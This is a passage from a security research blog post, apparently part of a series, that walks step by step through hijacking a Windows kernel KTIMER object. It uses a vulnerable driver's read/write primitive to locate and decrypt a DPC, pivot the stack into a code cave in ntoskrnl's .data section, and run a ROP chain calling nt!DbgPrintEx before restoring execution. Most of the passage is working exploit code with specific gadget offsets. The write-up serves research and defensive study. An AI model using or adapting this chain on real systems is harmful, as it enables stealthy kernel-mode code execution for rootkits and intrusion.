+</span><span style=color:#75715e></span>write64(hProcess, hDriver, retAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x50</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x201b7b</span>); <span style=color:#75715e>// 0x140201b7b: ret  ;  (1 found) ALIGN STACK 16 bytes
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, retAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x58</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x2024e2</span>); <span style=color:#75715e>// 0x1402024e2: jmp rax ;  (1 found)
+</span></code></pre></div><h3 id=5-triggering-the-rop-chain>5. Triggering the ROP Chain<a hidden class=anchor aria-hidden=true href=#5-triggering-the-rop-chain>#</a></h3>
+<p>To trigger the ROP chain we resume the thread using <code>ResumeThread()</code> and sleep for 1s for the ROP chain to execute and store the <code>KPCR</code> in the user-mode address.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>// 5) Resume the dummyThread to trigger the ROP chain
+</span><span style=color:#75715e></span>ResumeThread(dummyThread);
+
+<span style=color:#75715e>// Sleep s.t. thread has time to execute
+</span><span style=color:#75715e></span>Sleep(<span style=color:#ae81ff>1000</span>);
+</code></pre></div><p>Running the code, we see that it outputs that it found the <code>KPCR</code> at 0xfffff80629512000.
+<p align=center>
+<img loading=lazy src=kpcr.png alt="KPCR using KernelForge">
+</p>
+</p>
+<p>In the debugger, we confirm that we indeed found the correct address for the <code>KPCR</code> using KernelForge.
+<p align=center>
+<img loading=lazy src=kpcr_windbg.png alt="KPCR in WinDbg">
+</p>
+</p>
+<h2 id=ktimer-hijack>KTIMER Hijack<a hidden class=anchor aria-hidden=true href=#ktimer-hijack>#</a></h2>
+<p>Now that we obtained the address to the <code>KPCR</code> using KernelForge we start with the actual logic behind KTIMER hijacking.
+First, we describe our implementation for traversing the <code>KTIMER</code> objects to find the object that belongs to the <code>nt!ExpCenturyDpcRoutine</code>.
+Second, we describe our implementation for the DPC decryption and the confirmation whether we found the correct <code>KTIMER</code> object.
+Next, we describe our implementation for the calling of an arbitrary kernel-mode routine <code>nt!DbgPrintEx</code> with controlled arguments and hijack the target <code>DeferredRoutine</code>.
+Finally, we hijack the KTIMER by setting the <code>DueTime</code> and leave a &ldquo;ticking time bomb&rdquo; the kernel.</p>
+<h3 id=ktimer-traverse>KTIMER traverse<a hidden class=anchor aria-hidden=true href=#ktimer-traverse>#</a></h3>
+<p>As described in <a href=../ktimer-hijack-pt1/>part 1</a> of the series, from the <code>KPCR</code> we can find the <code>TimerTable</code> and the <code>KTIMER</code> objects for that specific processor.
+These objects contain the Deferred Procedure Calls (DPCs) that want to be fired at a specific interrupt time.</p>
+<p>Refer to the code below.
+First, we read the interrupt time and system time from <code>KUSER_SHARED_DATA</code> using the ARW from our BYOVD.
+On our build <code>KUSER_SHARED_DATA</code> still resides on the static location 0xfffff78000000000.
+We use these times to calculate the absolute time of each <code>KTIMER</code> object&rsquo;s <code>DueTime</code>.
+Next, we loop over the second array containing the standard timers.
+Recall that this array contains 256 entries (0xff).
+While the linked list with <code>KTIMER</code> objects is not &ldquo;empty&rdquo; for each timer entry we retrieve its <code>DueTime</code> and see if it is large enough to represent the passing of the century.
+If found, we jump out of the loops and continue execution.
+If not found, we end up with the last <code>KTIMER</code> object in the linked list from the last entry in the array with standard timers.
+Hence, we have to check whether we actually found the correct <code>KTIMER</code> object representing the <code>nt!ExpCenturyDpcRoutine</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp>DWORD64 kUserSharedData <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xfffff78000000000</span>;
+DWORD64 interruptTime <span style=color:#f92672>=</span> read64(hProcess, hDriver, kUserSharedData <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>); <span style=color:#75715e>//KUSER_SHARED_DATA.InterruptTime
+</span><span style=color:#75715e></span>DWORD64 systemTime <span style=color:#f92672>=</span> read64(hProcess, hDriver, kUserSharedData <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>); <span style=color:#75715e>//KUSER_SHARED_DATA.SystemTime
+</span><span style=color:#75715e></span>DWORD64 kTimer, dueTime, listHead, flink <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0xff</span>; i<span style=color:#f92672>++</span>) {
+  <span style=color:#75715e>//                KPRCB   TimTab   TimEnt  [1]     [i] |KTIM|  LIST
+</span><span style=color:#75715e></span>  listHead <span style=color:#f92672>=</span> kPcr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x180</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x3c00</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x200</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x2000</span> <span style=color:#f92672>+</span> i <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x20</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>;
+  flink <span style=color:#f92672>=</span> read64(hProcess, hDriver, listHead);
+  kTimer <span style=color:#f92672>=</span> flink <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x20</span>;
+  <span style=color:#66d9ef>int</span> listEntry <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+
+  <span style=color:#66d9ef>while</span> (flink <span style=color:#f92672>!=</span> listHead) {
+    dueTime <span style=color:#f92672>=</span> read64(hProcess, hDriver, kTimer <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span>);
+    <span style=color:#66d9ef>if</span> (((systemTime <span style=color:#f92672>-</span> interruptTime <span style=color:#f92672>+</span> dueTime) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x0220000000000000</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x0220000000000000</span>) {
+      printf(<span style=color:#e6db74>&#34;[+] Found likely kTimer entry for nt!ExpCenturyDpcRoutine: %p at TimerTable[1][%d], LIST_ENTRY #%d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, kTimer, i, listEntry);
+      <span style=color:#66d9ef>goto</span> found;
+    }
+    flink <span style=color:#f92672>=</span> read64(hProcess, hDriver, flink);
+    listEntry<span style=color:#f92672>++</span>;
+    kTimer <span style=color:#f92672>=</span> flink <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x20</span>;
+  }
+}
+found:
+DWORD64 encryptedDpc <span style=color:#f92672>=</span> read64(hProcess, hDriver, kTimer <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x30</span>);
+printf(<span style=color:#e6db74>&#34;[+] Encrypted DPC: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, encryptedDpc);
+</code></pre></div><p>Running the code, we see that it outputs that it found the <code>KTIMER</code> at 0xfffff8062c949ee0.
+<p align=center>
+<img loading=lazy src=ktimer.png alt="KTIMER output">
+</p>
+</p>
+<p>We confirm that we indeed found the correct address for the <code>KTIMER</code> at the 196th element in the array for standard timers.
+Decrypting the DPC should give us the DPC at 0xfffff8062c949ea0 (magenta)
+<p align=center>
+<img loading=lazy src=ktimer_windbg.png alt="KTIMER in WinDbg">
+</p>
+</p>
+<h3 id=dpc-decryption>DPC Decryption<a hidden class=anchor aria-hidden=true href=#dpc-decryption>#</a></h3>
+<p>To confirm that we actually found the correct <code>KTIMER</code> object, we first have to decrypt the DPC.
+The decryption routine reversed in <a href=../ktimer-hijack-pt1/>part 1</a> can be implemented with the following function.
+First, we read <code>nt!KiWaitNever</code> and <code>nt!KiWaitAlways</code> using the driver vulnerability.
+These, along with the address of the <code>KTIMER</code> object are used to decrypt the encrypted DPC in the <code>KTIMER</code> object.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>/**
+</span><span style=color:#75715e>* Decrypts the DPC value in the KTIMER object
+</span><span style=color:#75715e>*/</span>
+DWORD64 <span style=color:#a6e22e>decryptDpc</span>(HANDLE process_handle, HANDLE driver_handle, DWORD64 nt_base, DWORD64 kTimer, DWORD64 encryptedDpc) {
+	DWORD64 kiWaitNever <span style=color:#f92672>=</span> read64(process_handle, driver_handle, (DWORD64)nt_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xd1de48</span>);
+	DWORD64 kiWaitAlways <span style=color:#f92672>=</span> read64(process_handle, driver_handle, (DWORD64)nt_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xd1e0d8</span>);
+
+	DWORD64 dpc <span style=color:#f92672>=</span> encryptedDpc;
+	dpc <span style=color:#f92672>^=</span> kiWaitNever;
+	dpc <span style=color:#f92672>=</span> _rotl64(dpc, kiWaitNever <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>);
+	dpc <span style=color:#f92672>^=</span> kTimer;
+	dpc <span style=color:#f92672>=</span> _byteswap_uint64(dpc);
+	dpc <span style=color:#f92672>^=</span> kiWaitAlways;
+	<span style=color:#66d9ef>return</span> dpc;
+}
+</code></pre></div><p>We confirm whether we found the target <code>KTIMER</code> object by calling this decryption routine and comparing its <code>DeferredRoutine</code> with the actual function address of <code>nt!ExpCenturyDpcRoutine</code> which is at <code>nt + 0x60cff0</code> on our build.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp>DWORD64 dpc <span style=color:#f92672>=</span> decryptDpc(hProcess, hDriver, (DWORD64)ntBase, kTimer, encryptedDpc);
+DWORD64 expCenturyDpcRoutine <span style=color:#f92672>=</span> (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x60cff0</span>;
+DWORD64 dpcRoutine <span style=color:#f92672>=</span> read64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span>);
+<span style=color:#66d9ef>if</span> (dpcRoutine <span style=color:#f92672>==</span> expCenturyDpcRoutine) {
+  printf(<span style=color:#e6db74>&#34;[+] Found ExpCenturyDpc: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, dpc);
+}
+<span style=color:#66d9ef>else</span> {
+  printf(<span style=color:#e6db74>&#34;[!] Did not find ExpCenturyDpc, exiting...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+}
+</code></pre></div><p>Running the code, we see that it indeed outputs that it found the <code>nt!ExpCenturyDpcRoutine</code> DPC at 0xfffff8062c949ea0 after decryption.
+<p align=center>
+<img loading=lazy src=dpc.png alt="DPC output">
+</p>
+</p>
+<h3 id=arbitrary-kernelmode-routine-rop-chain>Arbitrary Kernelmode Routine ROP chain<a hidden class=anchor aria-hidden=true href=#arbitrary-kernelmode-routine-rop-chain>#</a></h3>
+<p>Now that we know the locations the target <code>KTIMER</code> object and the corresponding <code>KDPC</code> object we decide with what we want to hijack the <code>KDPC.DeferredRoutine</code> and <code>KTIMER.DueTime</code>.
+The idea is that we use a specific gadget for the <code>DeferredRoutine</code> such that we can pivot the stack to a code cave where we store a ROP chain.
+For this, we first figure out which registers we can play with at the time of the execution of the <code>DeferredRoutine</code>.
+We modify the <code>KDPC</code> object as such, modifying the QWORDS which we think we can play with.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp>write64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span>, <span style=color:#ae81ff>0x4040404040404040</span>); <span style=color:#75715e>// ProcessorHistory
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x21a154</span>); <span style=color:#75715e>// DeferredRoutine
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x4141414141414141</span>); <span style=color:#75715e>// DeferredContext
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>, <span style=color:#ae81ff>0x4242424242424242</span>); <span style=color:#75715e>// SystemArgument1
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x4343434343434343</span>); <span style=color:#75715e>// SystemArgument2
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x38</span>, <span style=color:#ae81ff>0x4444444444444444</span>); <span style=color:#75715e>// DpcData
+</span></code></pre></div><p>Running the code and breaking in the debugger we see that the DPC (magenta) was indeed modified with our supplied values, including the gadget (orange).
+We set a breakpoint on the gadget and manually change the <code>KTIMER.DueTime</code> at offset 0x18 to the value of the current interrupt time s.t. it is queued immediately.
+Continuing execution, we see that we break at the gadget.
+Outputting the state of the registers, we see that rbx holds the value of the <code>KDPC.DeferredContext</code> which we control.
+Also, rsi and rcx both hold the address of the target <code>KDPC</code>.
+This should give us enough control to play with the available gadgets and somehow pivot the stack to a ROP chain.</p>
+<p>Inspecting the target <code>KDPC</code> again, we notice that the <code>KDPC.ProcessorHistory</code> is OR&rsquo;ed with 0x1 (dark green).
+This is highly likely because the DPC runs on CPU 0 as we have mentioned before.
+This is something we need to take into account when we want to use that address.
+<p align=center>
+<img loading=lazy src=deferredroutine.png alt="At the moment of DeferredRoutine gadget">
+</p>
+</p>
+<h4 id=finding-a-code-cave>Finding a Code Cave<a hidden class=anchor aria-hidden=true href=#finding-a-code-cave>#</a></h4>
+<p>Before we can continue, we have to decide where we want to store our ROP chain and data.
+We only need about 0x200 bytes, so we check whether the end of the <code>.data</code> section of the kernel (<code>nt</code>) is used.
+The following screenshot shows part of the <code>!dh</code> command containing information about the writeable <code>.data</code> section starting at <code>nt + 0xc00000</code> and the <code>ALMOSTRO</code> section thereafter, starting at <code>nt + 0xd1c000</code>. The <code>.data</code> section has a virtual size of 0x11bdc8 bytes, meaning that there is a writeable code cave of 0x238 bytes between the two sections.
+We use that location to store our ROP chain and data.
+<p align=center>
+<img loading=lazy src=codecave.png alt="Code cave">
+</p>
+</p>
+<p>Because of the stackpivot we use, we have to add 1.
+This will become clear in the following section.
+Our code cave becomes:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp>DWORD64 codeCave <span style=color:#f92672>=</span> (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xd1c000</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x238</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>; <span style=color:#75715e>// at end of .data section
+</span></code></pre></div><h4 id=replacing-deferredroutine-with-stackpivot>Replacing DeferredRoutine with Stackpivot<a hidden class=anchor aria-hidden=true href=#replacing-deferredroutine-with-stackpivot>#</a></h4>
+<p>As we have seen, we control the data that rcx points to (the <code>KDPC</code> object) and the value of rdx.
+We came up with the solution in the following code block that uses a JOP gadget for the stackpivot.
+The JOP gadget moves the <code>KDPC.ProcessorHistory</code> to rsp and uses it as the new stack, before jumping to rdx.
+In rdx we put a NOP ROP gadget that returns into the newly controlled stack.
+We place the code cave at <code>KDPC.ProcessorHistory</code> and make sure that the least significant bit is 0x1 because of the restriction we have seen before (it will set this bit because the DPC runs on CPU 0).
+This will misalign the stack with 0x1 byte which we have to account for later.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>// new stack address
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span>, codeCave);
+
+<span style=color:#75715e>// KTIMER.DPC.DeferredRoutine -&gt; stackpivot
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x42ce28</span>); <span style=color:#75715e>// 0x42ce28: mov rsp, qword [rcx+0x10] ; jmp rdx ; (1 found)
+</span><span style=color:#75715e></span>
+<span style=color:#75715e>// will end up in rdx
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x21a154</span>); <span style=color:#75715e>// 0x21a154: nop; ret;  (1 found)
+</span><span style=color:#75715e></span>
+<span style=color:#75715e>// systemargument and further
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x21a154</span>); <span style=color:#75715e>// 0x21a154: nop; ret;  (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x4444444444444442</span>);
+write64(hProcess, hDriver, dpc <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x38</span>, <span style=color:#ae81ff>0x4444444444444443</span>);
+</code></pre></div><blockquote>
+<p>Note that we restrict ourselves to only use gadgets from <code>ntoskrnl.exe</code>.
+We are sure that there are way better solutions if you take the time to search for gadgets in other kernel modules.
+Nevertheless, our solution suffices for a proof of concept and show some tricks when gadgets are scarce.</p>
+</blockquote>
+<h4 id=aligning-rsp>Aligning RSP<a hidden class=anchor aria-hidden=true href=#aligning-rsp>#</a></h4>
+<p>First thing we do in our ROP chain is aligning the stack to 0x8 bytes.
+For this, we AND rsp with 0xfffffffffffffffe as can be seen below.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>// align rsp
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x868131</span>);        <span style=color:#75715e>// 0x868131: pop r8; ret; (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x180</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>);        <span style=color:#75715e>// 0xfffffffffffffffe
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x368d4e</span>); <span style=color:#75715e>// 0x368d4e: and rsp, qword[r8]; inc word[rcx + 0x20]; add rsp, 0x28; ret; (1 found)
+</span><span style=color:#75715e></span>codeCave<span style=color:#f92672>--</span>; <span style=color:#75715e>//alignment
+</span><span style=color:#75715e></span>
+<span style=color:#75715e>//DATA
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x180</span>, <span style=color:#ae81ff>0xfffffffffffffffe</span>); <span style=color:#75715e>// mask to align stack
+</span></code></pre></div><h4 id=calling-ntdbgprintex>&ldquo;Calling&rdquo; nt!DbgPrintEx<a hidden class=anchor aria-hidden=true href=#calling-ntdbgprintex>#</a></h4>
+<p>Now that the stack is aligned we set up the arguments for the &ldquo;call&rdquo; to <code>nt!DbgPrintEx</code> (actually a return into).
+<a href=https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprintex>MSDN</a> defines the following function prototype.
+The first argument, rcx, must contain a <code>ComponentId</code>.
+We use <code>DPFLTR_IHVDRIVER_ID</code> which is 77.
+We leave the level, rdx, 0 and store the pointer to our string in <code>r8</code>.
+We set r9 0 because we will not be using a format string.
+The string is stored in little endian and reads: &ldquo;KTIMER hijack by Gerr.re&rdquo;.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt>NTSYSAPI ULONG DbgPrintEx(
+  [in] ULONG ComponentId,
+  [in] ULONG Level,
+  [in] PCSTR Format,
+       ...   
+);
+</code></pre></div><p>We end up with the following ROP chain to &ldquo;call&rdquo; the arbitrary API <code>nt!DbgPrintEx</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>// nt!DbgPrintEx
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x40</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x7bb073</span>); <span style=color:#75715e>// 0x7bb073: pop rcx ; ret ; (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x48</span>, <span style=color:#ae81ff>77</span>);						             <span style=color:#75715e>// DPFLTR_IHVDRIVER_ID
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x50</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x72b676</span>); <span style=color:#75715e>// 0x72b676: pop rdx; ret; (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x58</span>, <span style=color:#ae81ff>0x0</span>);                        <span style=color:#75715e>// Level = 0
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x60</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x868131</span>); <span style=color:#75715e>// 0x868131: pop r8; ret; (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x68</span>, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x200</span>);           <span style=color:#75715e>// pointer to STRING
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x70</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x447723</span>); <span style=color:#75715e>// 0x447723: pop r9 ; ret ; (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x78</span>, <span style=color:#ae81ff>0x0</span>);                        
+write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x80</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x2cc330</span>); <span style=color:#75715e>// nt!DbgPrintEx
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x88</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x67bfaf</span>); <span style=color:#75715e>// 0x67bfaf: add rsp, 0x28 ; ret ; (1 found)
+</span><span style=color:#75715e></span>
+<span style=color:#75715e>//DATA
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x200</span>, <span style=color:#ae81ff>0x682052454d49544b</span>); <span style=color:#75715e>// STRING
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x208</span>, <span style=color:#ae81ff>0x7962206b63616a69</span>); <span style=color:#75715e>// STRING
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x210</span>, <span style=color:#ae81ff>0x65722e7272654720</span>); <span style=color:#75715e>// STRING
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x218</span>, <span style=color:#ae81ff>0x000000000000000a</span>); <span style=color:#75715e>// STRING
+</span></code></pre></div><h4 id=restoring-the-execution-flow>Restoring the Execution Flow<a hidden class=anchor aria-hidden=true href=#restoring-the-execution-flow>#</a></h4>
+<p>Now that we achieved our goal of calling an arbitrary API we have to restore the execution flow.
+In kernel space this is crucial because a violation will result in a Blue Screen Of Death (BSOD).
+Unfortunately, because we overwrote the original rsp using our stackpivot we have to find another way of retrieving it.</p>
+<p>At the time of executing the <code>DeferredRoutine</code>, the registers are as follows as we have seen before.
+We note that r14 is 0x2a0 bytes offset from rsp, which we empirically found is always the case.
+Using r14 and subtracting the offset of 0x2a0 yields the original rsp.
+<p align=center>
+<img loading=lazy src=rsp.png alt="Registers at the moment of DeferredRoutine gadget">
+</p>
+</p>
+<p>We use the following ROP chain.
+First, we store a ROP gadget in rax that pops a value from the stack and returns into the next gadget.
+This is needed because we use a COP gadget to move r14 into rcx which will push a return address on the stack.
+The gadget in rax will pop that return address to nullify the call.
+Next, we use a gadget to subtract the offset from rcx, which comes with some side effects like adding 0x8 to the address.
+We can simply nullify this by subtracting 0x8 from the target address containing the offset 0x2a0.
+Now that we have the original value of rsp, we push it on stack and remember the stack location.
+Finally, we store a NOP ROP gadget in rdx and use the same gadget as we used as the stackpivot to restore the original rsp.
+Returning from the NOP ROP gadget will return into the original return address, continuing the original execution flow.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>// restore execution flow from r14
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xb8</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x687534</span>); <span style=color:#75715e>// 0x687534: pop rax; ret; (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xc0</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x687534</span>); <span style=color:#75715e>// 0x687534: pop rax; ret; (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xc8</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x412334</span>); <span style=color:#75715e>// 0x412334: mov rcx, r14; call rax; (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xd0</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x72b676</span>); <span style=color:#75715e>// 0x72b676: pop rdx; ret; (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xd8</span>, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1a8</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x8</span>);     <span style=color:#75715e>// pointer to rsp offset minus 0x8
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xe0</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x868131</span>); <span style=color:#75715e>// 0x868131: pop r8; ret; (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xe8</span>, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1c0</span>);           <span style=color:#75715e>// some writeable address
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xf0</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28ed93</span>); <span style=color:#75715e>// 0x28ed93: sub rcx, qword[rdx + 0x08]; mov qword[r8 + 0x08], rcx; ret; (1 found)
+</span><span style=color:#75715e></span>DWORD64 ptrRsp <span style=color:#f92672>=</span> codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xf8</span>;
+write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xf8</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x3f3a37</span>); <span style=color:#75715e>// 0x3f3a37: push rcx ; and al, 0x60 ; add rsp, 0x58 ; ret ; (1 found)
